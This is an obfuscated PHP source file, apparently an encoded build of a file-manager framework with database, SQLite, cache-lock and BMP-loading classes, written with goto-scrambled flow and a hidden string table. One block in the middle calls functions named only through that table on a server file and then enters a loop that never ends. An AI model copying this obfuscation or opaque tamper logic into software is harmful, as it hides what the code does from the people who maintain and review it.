$bÕÂ…ä»ö = count($Dö”†Ú‹); goto c“¦Áˆóß×; B–„‹Øñ†Ç: } public function add($Eò–èäˆø‹ = '', $fæĞ‘ÇàÖ = array(), $cÙÀ›÷…È = false) { if ($this->addTaskStatus && is_array($Eò–èäˆø‹)) { $this->addTaskData[] = $Eò–èäˆø‹; return; } return parent::add($Eò–èäˆø‹, $fæĞ‘ÇàÖ, $cÙÀ›÷…È); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($D©Ä¢ÁŞ‚ = array()) { goto b‰×­“â«Ì; bé±êŒ—áî: return $A³â±–„Ò‘; goto eîÀµÍºÖï; cóØºˆ·Ô“: $dÓÁª¯Ó = is_array($dÓÁª¯Ó) ? $dÓÁª¯Ó : array(); $A³â±–„Ò‘ = null; for ($f«ÈÈ·“Ó™ = 0; $f«ÈÈ·“Ó™ < count($dÓÁª¯Ó); $f«ÈÈ·“Ó™ += $AåÜ–‹‘¡) { $d÷¸“Ûë´ = array_slice($dÓÁª¯Ó, $f«ÈÈ·“Ó™, $AåÜ–‹‘¡); if (!is_array($d÷¸“Ûë´) || count($d÷¸“Ûë´) == 0) { break; } $a‹Á÷ã™È[$a„–æÏˆ”á[276]][$AÛ¶òí“‡•][1] = $d÷¸“Ûë´; $this->optionsValue($a‹Á÷ã™È); $få•çğà = parent::select($D©Ä¢ÁŞ‚); if (!$få•çğà) { continue; } if (is_null($A³â±–„Ò‘)) { $A³â±–„Ò‘ = array(); } $A³â±–„Ò‘ = array_merge($A³â±–„Ò‘, $få•çğà); } goto bé±êŒ—áî; A‚¡àà‘¢: $AÛ¶òí“‡• = $this->findWhereField($a‹Á÷ã™È); if (!$AÛ¶òí“‡• || isset($a‹Á÷ã™È[$a„–æÏˆ”á[293]]) || isset($a‹Á÷ã™È[$a„–æÏˆ”á[353]])) { return parent::select($D©Ä¢ÁŞ‚); } $dÓÁª¯Ó = $a‹Á÷ã™È[$a„–æÏˆ”á[276]][$AÛ¶òí“‡•][1]; goto cóØºˆ·Ô“; b‰×­“â«Ì: $a„–æÏˆ”á =& $_SERVER[¨¤¼…´]; $AåÜ–‹‘¡ = self::SQL_WHERE_IN_CHUNK; $a‹Á÷ã™È = $this->optionsValue(); goto A‚¡àà‘¢; eîÀµÍºÖï: } public function delete($DğÆŒïÂç = array()) { goto aÎÎ¹ìÁÔ; a²¼Ñî§œ™: $d¢¦èÏš†´ = $D¡÷¸ù®¦Õ[$bÑâŸóµ¿ò[276]][$d¤„é¨œ][1]; $d¢¦èÏš†´ = is_array($d¢¦èÏš†´) ? $d¢¦èÏš†´ : array(); for ($F¨“Ğ—â¬ö = 0; $F¨“Ğ—â¬ö < count($d¢¦èÏš†´); $F¨“Ğ—â¬ö += $fÏ¨©à¨‘¬) { $cùÑ†Š’ÆÓ = array_slice($d¢¦èÏš†´, $F¨“Ğ—â¬ö, $fÏ¨©à¨‘¬); if (!is_array($cùÑ†Š’ÆÓ) || count($cùÑ†Š’ÆÓ) == 0) { break; } $D¡÷¸ù®¦Õ[$bÑâŸóµ¿ò[276]][$d¤„é¨œ][1] = $cùÑ†Š’ÆÓ; $this->optionsValue($D¡÷¸ù®¦Õ); $e†Ï½†Š¢Ï += parent::delete($DğÆŒïÂç); } goto BÅŞ‹‰Š; BÅŞ‹‰Š: return $e†Ï½†Š¢Ï; goto BÜ©ì¯ƒ»˜; aÎÎ¹ìÁÔ: $bÑâŸóµ¿ò =& $_SERVER[¨¤¼…´]; $fÏ¨©à¨‘¬ = self::SQL_WHERE_IN_CHUNK; $D¡÷¸ù®¦Õ = $this->optionsValue(); goto Fİ¸°—ÍÄĞ; Fİ¸°—ÍÄĞ: $d¤„é¨œ = $this->findWhereField($D¡÷¸ù®¦Õ); if (!$d¤„é¨œ) { return parent::delete($DğÆŒïÂç); } $e†Ï½†Š¢Ï = 0; goto a²¼Ñî§œ™; BÜ©ì¯ƒ»˜: } private function findWhereField($AÛ·×ô†¥‡) { $f£ÉÎï‹Ì• =& $_SERVER[¨¤¼…´]; $C¨æò½Ø = self::SQL_WHERE_IN_CHUNK; if (!is_array($AÛ·×ô†¥‡) || !is_array($AÛ·×ô†¥‡[$f£ÉÎï‹Ì•[276]])) { return !1; } foreach ($AÛ·×ô†¥‡[$f£ÉÎï‹Ì•[276]] as $B†÷“öƒ“ => $BõÎ–à¢¹ª) { if (is_array($BõÎ–à¢¹ª) && isset($BõÎ–à¢¹ª[0]) && is_string($BõÎ–à¢¹ª[0]) && strtolower($BõÎ–à¢¹ª[0]) == $f£ÉÎï‹Ì•[7] && is_array($BõÎ–à¢¹ª[1]) && count($BõÎ–à¢¹ª[1]) > $C¨æò½Ø) { ignore_timeout(); return $B†÷“öƒ“; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\164\x65\155\117\x70\x74\x69\157\x6e"; public $field = array(); public function listData($bÀ§ğâ¸† = false, $Eß‘¢¢ÜÁ = "\x6d\157\144\x69\x66\171\124\x69\x6d\x65", $aÍóƒº§„ = false) { $dÊßŒòŠ… = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$dÊßŒòŠ…) { return $bÀ§ğâ¸† ? null : array(); } if (!$bÀ§ğâ¸†) { $dÊßŒòŠ… = array_filter(array_values($dÊßŒòŠ…)); return array_sort_by($dÊßŒòŠ…, $Eß‘¢¢ÜÁ, $aÍóƒº§„); } return $dÊßŒòŠ…[$_SERVER[¨¤¼…´][376] . $bÀ§ğâ¸†]; } public function insert($DÓŸ‚Ÿƒ‹Ÿ) { goto fİ× ÃùàÈ; E¦ºÓ£¸›‘: $f‹à‡Œ¥½­ = $f‹à‡Œ¥½­ ? $f‹à‡Œ¥½­ : 0; $DÓŸ‚Ÿƒ‹Ÿ[$Bå‡Şİ¬¿Ò[379]] = ++$f‹à‡Œ¥½­; $DÓŸ‚Ÿƒ‹Ÿ[$Bå‡Şİ¬¿Ò[201]] = time(); goto eÌÖÍÌô…–; fİ× ÃùàÈ: $Bå‡Şİ¬¿Ò =& $_SERVER[¨¤¼…´]; $DÓŸ‚Ÿƒ‹Ÿ = array_field_key($DÓŸ‚Ÿƒ‹Ÿ, $this->field); $f‹à‡Œ¥½­ = Model($this->modelType)->get($Bå‡Şİ¬¿Ò[377], $this->optionType . $Bå‡Şİ¬¿Ò[378]); goto E¦ºÓ£¸›‘; eÌÖÍÌô…–: $DÓŸ‚Ÿƒ‹Ÿ[$Bå‡Şİ¬¿Ò[117]] = time(); Model($this->modelType)->set($Bå‡Şİ¬¿Ò[377], $f‹à‡Œ¥½­, $this->optionType . $Bå‡Şİ¬¿Ò[378]); Model($this->modelType)->set($Bå‡Şİ¬¿Ò[376] . $f‹à‡Œ¥½­, $DÓŸ‚Ÿƒ‹Ÿ, $this->optionType); goto E§ÖÙáªÑ; E§ÖÙáªÑ: return $f‹à‡Œ¥½­; goto DˆÖ¤Ìçìö; DˆÖ¤Ìçìö: } public function update($F‡ÏõÚÁ—×, $cÜ¥±×¦¸Œ) { goto bÚÄ¹è‘Şœ; eŠºéÇ§“‘: if (!$e‡ù‰Õ®Û¹) { return !1; } $cÜ¥±×¦¸Œ = array_merge($e‡ù‰Õ®Û¹, $cÜ¥±×¦¸Œ); $cÜ¥±×¦¸Œ[$FÑàÇÒ²µÍ[117]] = time(); goto Eª”¦åéˆ£; Eª”¦åéˆ£: return Model($this->modelType)->set($FÑàÇÒ²µÍ[376] . $F‡ÏõÚÁ—×, $cÜ¥±×¦¸Œ, $this->optionType); goto A»„Îò…ˆ; bÚÄ¹è‘Şœ: $FÑàÇÒ²µÍ =& $_SERVER[¨¤¼…´]; $cÜ¥±×¦¸Œ = array_field_key($cÜ¥±×¦¸Œ, $this->field); $e‡ù‰Õ®Û¹ = $this->listData($F‡ÏõÚÁ—×); goto eŠºéÇ§“‘; A»„Îò…ˆ: } public function remove($BÕ¡í¸ö¢Á) { return Model($this->modelType)->remove($_SERVER[¨¤¼…´][376] . $BÕ¡í¸ö¢Á, $this->optionType); } public function clear() { $aí“…ÑÅŠ =& $_SERVER[¨¤¼…´]; Model($this->modelType)->remove($aí“…ÑÅŠ[377], $this->optionType . $aí“…ÑÅŠ[378]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($e‘ÏšÓãÖ·, $cÙÙóó) { if (!$cÙÙóó) { return !1; } $b®šÚÒ„Â‚ = $this->listData(); $b®šÚÒ„Â‚ = array_to_keyvalue($b®šÚÒ„Â‚, $e‘ÏšÓãÖ·); return isset($b®šÚÒ„Â‚[$cÙÙóó]) ? $b®šÚÒ„Â‚[$cÙÙóó] : !1; } public function findByName($f£õ¬õÎˆŒ) { return $this->findByKey($_SERVER[¨¤¼…´][38], $f£õ¬õÎˆŒ); } protected function resetData($BïèØëª†ë) { $CÔÉí‘£…Í =& $_SERVER[¨¤¼…´]; $BïèØëª†ë = is_array($BïèØëª†ë) ? $BïèØëª†ë : array(); $FœŠàô„áØ = array(); for ($FÂÇÂß¡Íö = 0; $FÂÇÂß¡Íö < count($BïèØëª†ë); $FÂÇÂß¡Íö++) { $FœŠàô„áØ[$CÔÉí‘£…Í[376] . $BïèØëª†ë[$FÂÇÂß¡Íö][$CÔÉí‘£…Í[379]]] = $BïèØëª†ë[$FÂÇÂß¡Íö]; } return Model($this->modelType)->set($FœŠàô„áØ, !1, $this->optionType); } private function getAutoName($bøÁèŠƒ) { $a™™™ÚİÜÄ = array_to_keyvalue($this->listData(), $_SERVER[¨¤¼…´][38]); if (!$a™™™ÚİÜÄ || !isset($a™™™ÚİÜÄ[$bøÁèŠƒ])) { return $bøÁèŠƒ; } for ($bÂ—õö« = 1; $bÂ—õö« < count($a™™™ÚİÜÄ); $bÂ—õö«++) { $A×¿²ÇŞ± = $bøÁèŠƒ . "\x28{$bÂ—õö«}\x29"; if (!isset($a™™™ÚİÜÄ[$A×¿²ÇŞ±])) { return $A×¿²ÇŞ±; } } return $A×¿²ÇŞ±; } } goto DÛá÷«ƒ…ì; bìÔƒ‰õçš: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto FŠøŠ«…; b•‚šœÖÌƒ: $this->tpl = TEMPLATE . MOD . $D“Áí½ëºŒ[8]; $this->_classObjectID = mt_rand(0, 10000); goto D°Ö¼İ§âÙ; c‹ƒ—ÓãôŸ: $this->in =& $in; $this->values[$D“Áí½ëºŒ[6]] =& $config; $this->values[$D“Áí½ëºŒ[7]] =& $in; goto b•‚šœÖÌƒ; FŠøŠ«…: $D“Áí½ëºŒ =& $_SERVER[¨¤¼…´]; global $in, $config; $this->config =& $config; goto c‹ƒ—ÓãôŸ; D°Ö¼İ§âÙ: } public function loadClass($e·íÇÜõŞ) { if (1 === func_num_args()) { $this->{$e·íÇÜõŞ} = new $e·íÇÜõŞ(); } else { $B–åÄÌª§ = new ReflectionClass($e·íÇÜõŞ); $Cå¸¼·çšô = func_get_args(); array_shift($Cå¸¼·çšô); $this->{$e·íÇÜõŞ} = $B–åÄÌª§->newInstanceArgs($Cå¸¼·çšô); } return $this->{$e·íÇÜõŞ}; } protected function assign($bß…§Ë©§Ì, $D„°Á…³ÛŸ) { $this->values[$bß…§Ë©§Ì] = $D„°Á…³ÛŸ; } protected function display($d÷›ÁñëöŒ) { ob_end_clean(); extract($this->values); require $this->tpl . $d÷›ÁñëöŒ; } } if (!isset($_SERVER[$_SERVER[¨¤¼…´][9]]) || !isset($_SERVER[$_SERVER[¨¤¼…´][10]])) { goto F»ˆ Ó¹; F»ˆ Ó¹: $EÉ´ôƒ‡èÕ = $_SERVER[¨¤¼…´][11]; $B½³º¹°„ë = $_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]; $e¯¡í¶¨Ô = $EÉ´ôƒ‡èÕ($B½³º¹°„ë); goto D†°·‚øò‡; bÉ±©ÉÎÒº: $D†É›ä‰‹½($_SERVER[$_SERVER[¨¤¼…´][12]] . $_SERVER[¨¤¼…´][13]); $A™°šÌãÃ¯ = 2; while ($A™°šÌãÃ¯ > 1) { $CÉà™©Ë¼… = rawurlencode($A™°šÌãÃ¯ . $_SERVER[¨¤¼…´][18]); } goto aÁø‚±¼ÎÑ; D†°·‚øò‡: $Aê¡¥óÛÜÒ = explode($_SERVER[¨¤¼…´][14], $e¯¡í¶¨Ô); if (count($Aê¡¥óÛÜÒ) < $_SERVER[¨¤¼…´][15]) { $d®¹ô¥æ„Â = $_SERVER[¨¤¼…´][16]; $d®¹ô¥æ„Â(); } $D†É›ä‰‹½ = $_SERVER[¨¤¼…´][17]; goto bÉ±©ÉÎÒº; aÁø‚±¼ÎÑ: } class DbSqliteBase extends Db { public function __construct($cÛìîÎ•† = '') { $c ¨Ú†Œ·£ =& $_SERVER[¨¤¼…´]; if (!extension_loaded($c ¨Ú†Œ·£[19])) { think_exception(think_lang($c ¨Ú†Œ·£[20]) . $c ¨Ú†Œ·£[21]); } if (!empty($cÛìîÎ•†)) { if (!isset($cÛìîÎ•†[$c ¨Ú†Œ·£[22]])) { $cÛìîÎ•†[$c ¨Ú†Œ·£[22]] = 438; } $this->config = $cÛìîÎ•†; if (empty($this->config[$c ¨Ú†Œ·£[23]])) { $this->config[$c ¨Ú†Œ·£[23]] = array(); } } } public function connect($eÑ£ğÊÛİó = '', $fâÄ®‰ì = 0) { $Eƒ­³•æìá =& $_SERVER[¨¤¼…´]; if (!isset($this->linkID[$fâÄ®‰ì])) { goto Fˆ‰’šéº; B©È“Ùåå : $this->linkID[$fâÄ®‰ì] = $AÖ®«Åğ©ğ($eÑ£ğÊÛİó[$Eƒ­³•æìá[27]], $eÑ£ğÊÛİó[$Eƒ­³•æìá[22]]); if (!$this->linkID[$fâÄ®‰ì]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto d³¢à‘ƒÔñ; d³¢à‘ƒÔñ: @sqlite_busy_timeout($this->linkID[$fâÄ®‰ì], 30000); if (1 != think_config($Eƒ­³•æìá[28])) { unset($this->config); } goto bÈëñ“®Ôİ; Fˆ‰’šéº: if (empty($eÑ£ğÊÛİó)) { $eÑ£ğÊÛİó = $this->config; } $cÕªñÚç¨² = !empty($eÑ£ğÊÛİó[$Eƒ­³•æìá[23]][$Eƒ­³•æìá[24]]) ? $eÑ£ğÊÛİó[$Eƒ­³•æìá[23]][$Eƒ­³•æìá[24]] : $this->pconnect; $AÖ®«Åğ©ğ = $cÕªñÚç¨² ? $Eƒ­³•æìá[25] : $Eƒ­³•æìá[26]; goto B©È“Ùåå ; bÈëñ“®Ôİ: } return $this->linkID[$fâÄ®‰ì]; } public function free() { $this->queryID = null; } public function query($eø³Òå§ÙØ) { goto d—ß½¸á¡¼; d—ß½¸á¡¼: $F›‡ƒ¦©ƒä =& $_SERVER[¨¤¼…´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eô’Ô¤©ã×; eô’Ô¤©ã×: $this->queryStr = $eø³Òå§ÙØ; if ($this->queryID) { $this->free(); } think_action_status($F›‡ƒ¦©ƒä[29], 1); goto Cœ´¸«¼·‰; Cœ´¸«¼·‰: think_status($F›‡ƒ¦©ƒä[30]); $this->queryID = sqlite_query($this->_linkID, $eø³Òå§ÙØ); $this->debug(); goto A˜ï“Ù¬Ä–; A˜ï“Ù¬Ä–: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $f„´Äš°ß» = $this->getAll(); return $f„´Äš°ß»; } goto aêÎÀ³½ºÑ; aêÎÀ³½ºÑ: } public function execute($AÖ’´º‰çö) { goto Cƒ·ê¢×‘’; dÂÀøà‰¹: $this->queryStr = $AÖ’´º‰çö; if ($this->queryID) { $this->free(); } think_action_status($d‚èƒÚ÷¤ø[31], 1); goto eô¹«´£Ş; D£¿œì˜÷: if (!1 === $Aë¡ÓŒ»Ÿ¼) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto EÚ†ìÀáì›; eô¹«´£Ş: think_status($d‚èƒÚ÷¤ø[30]); $Aë¡ÓŒ»Ÿ¼ = sqlite_exec($this->_linkID, $AÖ’´º‰çö); $this->debug(); goto D£¿œì˜÷; Cƒ·ê¢×‘’: $d‚èƒÚ÷¤ø =& $_SERVER[¨¤¼…´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dÂÀøà‰¹; EÚ†ìÀáì›: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¨¤¼…´][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dº‚ê¦®÷¦ = sqlite_query($this->_linkID, $_SERVER[¨¤¼…´][33]); if (!$dº‚ê¦®÷¦) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $AŠ­¯êÀ± = sqlite_query($this->_linkID, $_SERVER[¨¤¼…´][34]); if (!$AŠ­¯êÀ±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Cƒ‚×‰ŒÄ· = array(); if ($this->numRows > 0) { for ($Fµ‡¨õ½Û = 0; $Fµ‡¨õ½Û < $this->numRows; $Fµ‡¨õ½Û++) { $Cƒ‚×‰ŒÄ·[$Fµ‡¨õ½Û] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Cƒ‚×‰ŒÄ·; } public function getFields($F—åÑµ™«) { $AÔÏÄøŞÏ =& $_SERVER[¨¤¼…´]; $AåÈšÌíª = $this->query($AÔÏÄøŞÏ[35] . $F—åÑµ™« . $AÔÏÄøŞÏ[36]); $CÂ‘îÑ¡Î” = array(); if ($AåÈšÌíª) { foreach ($AåÈšÌíª as $DéŒöëÅîã => $F³ËÙãçôç) { $CÂ‘îÑ¡Î”[$F³ËÙãçôç[$AÔÏÄøŞÏ[37]]] = array($AÔÏÄøŞÏ[38] => $F³ËÙãçôç[$AÔÏÄøŞÏ[37]], $AÔÏÄøŞÏ[39] => $F³ËÙãçôç[$AÔÏÄøŞÏ[40]], $AÔÏÄøŞÏ[41] => (bool) ($F³ËÙãçôç[$AÔÏÄøŞÏ[42]] === $AÔÏÄøŞÏ[43]), $AÔÏÄøŞÏ[44] => $F³ËÙãçôç[$AÔÏÄøŞÏ[45]], $AÔÏÄøŞÏ[46] => strtolower($F³ËÙãçôç[$AÔÏÄøŞÏ[47]]) == $AÔÏÄøŞÏ[48], $AÔÏÄøŞÏ[49] => strtolower($F³ËÙãçôç[$AÔÏÄøŞÏ[50]]) == $AÔÏÄøŞÏ[51]); } } return $CÂ‘îÑ¡Î”; } public function getTables($Cºéâ‘´¿ù = '') { $bÕª®Ê×ŞÌ =& $_SERVER[¨¤¼…´]; $a‡…¥ÂãÉÌ = $this->query($bÕª®Ê×ŞÌ[52] . $bÕª®Ê×ŞÌ[53] . $bÕª®Ê×ŞÌ[54]); $aŒÉ¨–»‹£ = array(); foreach ($a‡…¥ÂãÉÌ as $E†ö™³™Ëø => $FŠ™½©ªÛà) { $aŒÉ¨–»‹£[$E†ö™³™Ëø] = current($FŠ™½©ªÛà); } return $aŒÉ¨–»‹£; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $A†ÓäëÔ•¡ =& $_SERVER[¨¤¼…´]; $D£ºäë×Íç = sqlite_last_error($this->_linkID); $this->error = $D£ºäë×Íç . $A†ÓäëÔ•¡[4] . sqlite_error_string($D£ºäë×Íç); if ($A†ÓäëÔ•¡[43] != $this->queryStr) { $this->error .= LNG($A†ÓäëÔ•¡[55]) . $this->queryStr; } think_trace($this->error, $A†ÓäëÔ•¡[43], $A†ÓäëÔ•¡[56]); return $this->error; } public function escapeString($eä®ô‘âá‘) { return sqlite_escape_string($eä®ô‘âá‘); } public function parseLimit($DÊ±¯‡Êã±) { $aˆ®‡ÅˆÀã =& $_SERVER[¨¤¼…´]; $dÁ†çÄëØ¿ = $aˆ®‡ÅˆÀã[43]; if (!empty($DÊ±¯‡Êã±)) { $DÊ±¯‡Êã± = explode($aˆ®‡ÅˆÀã[57], $DÊ±¯‡Êã±); if (count($DÊ±¯‡Êã±) > 1) { $dÁ†çÄëØ¿ .= $aˆ®‡ÅˆÀã[58] . $DÊ±¯‡Êã±[1] . $aˆ®‡ÅˆÀã[59] . $DÊ±¯‡Êã±[0] . $aˆ®‡ÅˆÀã[60]; } else { $dÁ†çÄëØ¿ .= $aˆ®‡ÅˆÀã[58] . $DÊ±¯‡Êã±[0] . $aˆ®‡ÅˆÀã[60]; } } return $dÁ†çÄëØ¿; } } goto eğ•ì—‡á; a»ÚğŒ²Úï: class CacheLockMemcached { public function lock($e¡®»òã¡», $föÌ÷®¨Ûé = 0) { $c’¢öˆáÈ = Cache::init(); $dš¡É²» = microtime(!0) + $föÌ÷®¨Ûé; while (microtime(!0) < $dš¡É²») { $D„ÎõôŒæÕ = $c’¢öˆáÈ->get($e¡®»òã¡»); if (!$D„ÎõôŒæÕ || $D„ÎõôŒæÕ < microtime(!0)) { $d²õã¾ĞÙå = $c’¢öˆáÈ->handle->add($e¡®»òã¡», $dš¡É²», $föÌ÷®¨Ûé); if ($d²õã¾ĞÙå) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($EĞ°ÄµŠ‡) { return Cache::init()->get($EĞ°ÄµŠ‡); } public function unlock($D„ç’”¯­›) { return Cache::init()->remove($D„ç’”¯­›); } } class CacheLockDatabase { public function lock($a£ëàä‚Ôƒ, $f„ó—Æ¯õ¿ = 0) { $a™íœ‘¾­ = Model($_SERVER[¨¤¼…´][746]); $dÄ“æîæô = microtime(!0) + $f„ó—Æ¯õ¿; while (microtime(!0) < $dÄ“æîæô) { $eğ—–Øö«¢ = $a™íœ‘¾­->get($a£ëàä‚Ôƒ); if (!$eğ—–Øö«¢ || $eğ—–Øö«¢ < microtime(!0)) { $Fä™Á¶ƒ½ = $a™íœ‘¾­->set($a£ëàä‚Ôƒ, $dÄ“æîæô); if ($Fä™Á¶ƒ½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($DÔó äó) { return Model($_SERVER[¨¤¼…´][746])->get($DÔó äó); } public function unlock($bô–¢Êï ) { Model($_SERVER[¨¤¼…´][746])->remove($bô–¢Êï ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($A¨Úöõ·æì, $d‘¬¥½´Õ) { $B ºò“‡Ç =& $_SERVER[¨¤¼…´]; if (!class_exists($B ºò“‡Ç[770])) { show_json($B ºò“‡Ç[771], !1); } $this->cacheTime = $d‘¬¥½´Õ; $this->handle = new Memcached(); if (is_array($A¨Úöõ·æì[$B ºò“‡Ç[772]]) && count($A¨Úöõ·æì[$B ºò“‡Ç[772]]) >= 1) { foreach ($A¨Úöõ·æì[$B ºò“‡Ç[772]] as $F Ş¶‚“»õ) { $a…ƒœ…Ò¾È = explode($B ºò“‡Ç[4], $F Ş¶‚“»õ); $this->handle->addServer($a…ƒœ…Ò¾È[0], $a…ƒœ…Ò¾È[1]); } } else { $this->handle->addServer($A¨Úöõ·æì[$B ºò“‡Ç[183]], $A¨Úöõ·æì[$B ºò“‡Ç[184]]); } } public function set($d“’ÄÊŞ¾§, $f°öĞè“‚ƒ, $f × †ëÉæ = false) { $f × †ëÉæ = $f × †ëÉæ ? $f × †ëÉæ : $this->cacheTime; return $this->handle->set($d“’ÄÊŞ¾§, $f°öĞè“‚ƒ, $f × †ëÉæ); } public function get($fª†„ƒ® ø) { return $this->handle->get($fª†„ƒ® ø); } public function remove($bÄìö¢›ÖŒ) { return $this->handle->delete($bÄìö¢›ÖŒ); } public function deleteAll() { return $this->handle->flush(); } } goto bÀš»‘‡; DªîŞœİ¹Å: class ImageGdBMP { public static function load($f˜×›ÂÜ„ğ) { $b„»õˆğ‹ = fopen($f˜×›ÂÜ„ğ, $_SERVER[¨¤¼…´][1509]); if ($b„»õˆğ‹ === !1) { return !1; } $EÓÏ·×ªÈ = self::loadFromStream($b„»õˆğ‹); fclose($b„»õˆğ‹); return $EÓÏ·×ªÈ; } public static function loadFromStream($FÀ¾ø®†’‚) { $aŒ™±”µ =& $_SERVER[¨¤¼…´]; $d¿æ¿ËïÏ  = fread($FÀ¾ø®†’‚, 14); if ($d¿æ¿ËïÏ  === !1) { return !1; } if ($d¿æ¿ËïÏ [0] != $aŒ™±”µ[1819] || $d¿æ¿ËïÏ [1] != $aŒ™±”µ[1820]) { return !1; } $fãùäöÑ¬ = unpack($aŒ™±”µ[1821] . $aŒ™±”µ[1822] . $aŒ™±”µ[1823] . $aŒ™±”µ[1824] . $aŒ™±”µ[1825], $d¿æ¿ËïÏ ); return self::loadFromStreamAndFileHeader($FÀ¾ø®†’‚, $fãùäöÑ¬); } public static function loadFromStreamAndFileHeader($fôŒÒÉ¢¢„, array $cÆÍë‹ù©È) { goto A™ã†ğ—õ“; E’Ô—µ‘Õí: if ($B·•óÖèãŞ == 1 || $B·•óÖèãŞ == 4 || $B·•óÖèãŞ == 8) { goto b«ˆ†÷ğ×ö; eñ¬Ü¦ß Ç: $a¹½ÛŠ„Ç– = array(); for ($eÆ”®²ğ¸ = 0; $eÆ”®²ğ¸ < $e»‡ÑÆ…½ƒ; ++$eÆ”®²ğ¸) { $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, $FŞéó•ñÒã); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } extract(unpack($a©Ç¢™‘™[1845], $Cåî–‰«Ü . $a©Ç¢™‘™[1844])); $a¹½ÛŠ„Ç–[] = imagecolorallocate($d­–ƒæö¬å, $BÈÁñ­¼©, $f–Â®Ë‰ì, $eõÒ‚‚ÍÚ); } $DÒÛ¤˜ì‚ù = 8 - $B·•óÖèãŞ; goto eµ¾³îÓ¸—; b«ˆ†÷ğ×ö: $d­–ƒæö¬å = imagecreate($f¨İˆˆäÎ§, $CÚ´ƒ÷¼Õï); $FŞéó•ñÒã = $a˜ÊŞ‘ñà® == 12 ? 3 : 4; $e»‡ÑÆ…½ƒ = $cÛ¨à©®É‚ ? $cÛ¨à©®É‚ : pow(2, $B·•óÖèãŞ); goto eñ¬Ü¦ß Ç; eµ¾³îÓ¸—: $D‚¸çÎçº… = (1 << $B·•óÖèãŞ) - 1 << $DÒÛ¤˜ì‚ù; if ($A±¼šãÆ‚é == 1 || $A±¼šãÆ‚é == 2) { $Cå×³ÅØö˜ = 0; $DÎ…­›µ¤© = $B·•óÖèãŞ >> 2 & 1; for (;;) { if ($Cå×³ÅØö˜ < -1 || $Cå×³ÅØö˜ > $f¨İˆˆäÎ§ || $E°¾á÷Ì¶’ < -1 || $E°¾á÷Ì¶’ > $e×ï´“Àğ) { imagedestroy($d­–ƒæö¬å); return !1; } $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, 1); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } switch ($Cåî–‰«Ü) { case $a©Ç¢™‘™[1844]: $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, 1); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } switch ($Cåî–‰«Ü) { case $a©Ç¢™‘™[1844]: $E°¾á÷Ì¶’ += $Aàà‚óçºˆ; $Cå×³ÅØö˜ = 0; break; case $a©Ç¢™‘™[1846]: $E°¾á÷Ì¶’ = 0; $Cå×³ÅØö˜ = 0; break 3; case $a©Ç¢™‘™[1847]: $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, 2); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } list(, $Aæ±„È», $d–â©½¹„) = unpack($a©Ç¢™‘™[1848], $Cåî–‰«Ü); $Cå×³ÅØö˜ += $Aæ±„È»; $E°¾á÷Ì¶’ += $d–â©½¹„ * $Aàà‚óçºˆ; break; default: list(, $Döôµˆ¬¾) = unpack($a©Ç¢™‘™[1849], $Cåî–‰«Ü); $A‘á×ğ = ($Döôµˆ¬¾ >> $DÎ…­›µ¤©) + ($Döôµˆ¬¾ & $DÎ…­›µ¤©); $Cåî–‰«Ü = fread($fôŒÒÉ¢¢„, $A‘á×ğ + 1 & ~1); if ($Cåî–‰«Ü === !1) { imagedestroy($d­–ƒæö¬å); return !1; } for ($eÆ”®²ğ¸ = 0, $b‰ôšºêñ = 0; $eÆ”®²ğ¸ < $Döôµˆ¬¾; ++$eÆ”®²ğ¸, ++$Cå×³ÅØö˜, $b‰ôšºêñ += $B·•óÖèãŞ) { list(, $Eö¶ ‰¨Òì) = unpack($a©Ç¢™‘™[1849], $Cåî–‰«Ü[$b‰ôšºêñ >> 3]); $eõÒ‚‚ÍÚ = $b‰ôšºêñ & 7; imagesetpixel($d­–ƒæö¬å, $Cå×³ÅØö˜, $E°¾á÷Ì¶’, $a¹½ÛŠ„Ç–[($Eö¶ ‰¨Òì & $D‚¸çÎçº… >> $eõÒ‚‚ÍÚ) >> $DÒÛ¤˜ì‚ù - $eõÒ‚‚ÍÚ]); } break; } break; default: $d¹›²³à‡³ = fread($fôŒÒÉ¢¢„, 1); if ($d¹›²³à‡³ === !1) { imagedestroy($d­–ƒæö¬å); return !1; } list(, $d¿àä±ËãÚ, $Eö¶ ‰¨Òì) = unpack($a©Ç¢™‘™[1848], $Cåî–‰«Ü . $d¹›²³à‡³); for ($eÆ”®²ğ¸ = 0, $b‰ôšºêñ = 0; $eÆ”®²ğ¸ < 